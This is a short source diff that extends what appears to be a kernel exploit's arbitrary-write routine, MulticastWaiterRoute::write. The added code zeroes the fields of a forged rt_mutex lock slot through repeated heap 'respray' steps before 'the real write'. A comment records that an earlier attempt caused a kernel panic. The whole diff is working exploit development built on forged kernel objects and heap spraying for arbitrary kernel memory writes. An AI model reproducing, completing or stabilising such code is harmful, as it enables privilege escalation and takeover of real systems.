@@ -417,6 +417,24 @@ int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
             long rr = multicast_waiter_adjust(context);
             pr_info("mcast prep: [%#zx] <- 0 ret=%ld\n", addr, rr);
         }
+        /* A2: the same for the fixture lock the forged waiter points at.
+         * The panic proved the walk dereferences a field of that lock and got
+         * ASCII garbage (x10 = 0x6667202828282967) - the slot is not a valid
+         * rt_mutex, so zero wait_lock / waiters.rb_root / rb_leftmost / owner. */
+        if (context->layout.lock_slot_count) {
+            const size_t n = context->layout.lock_slot_count;
+            const size_t used = (context->lock_slot + n - 1) % n;
+            const uintptr_t slot = context->lock + context->layout.lock_slots_offset +
+                    used * context->layout.lock_slot_stride;
+            static const unsigned kLockFields[] = {0x0u, 0x8u, 0x10u, 0x18u};
+            for (size_t i = 0; i < sizeof(kLockFields) / sizeof(kLockFields[0]); i++) {
+                const uintptr_t addr = slot + kLockFields[i];
+                multicast_request_respray(context, addr, 0);
+                usleep(multicast_post_spray_settle_us());
+                long rr = multicast_waiter_adjust(context);
+                pr_info("mcast prep lock: [%#zx] <- 0 ret=%ld\n", addr, rr);
+            }
+        }
         /* leave the window benign again before the real write */
         multicast_request_respray(context, 0, 0);
         usleep(multicast_post_spray_settle_us());
